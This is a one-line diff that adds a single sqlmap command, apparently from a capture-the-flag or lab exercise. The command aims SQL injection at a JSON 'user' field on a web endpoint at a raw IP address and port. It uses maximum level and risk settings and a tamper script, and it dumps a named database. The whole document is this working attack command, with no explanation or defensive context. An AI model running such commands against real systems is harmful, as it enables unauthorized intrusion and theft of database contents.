@@ -1,0 +1,1 @@
+python sqlmap.py -u http://139.59.202.58:30311/index.php --method=POST --data="{\"user\": \"*\"}" -p user --level 5 --risk 3 --tamper=jsonescape --dump db_m8452
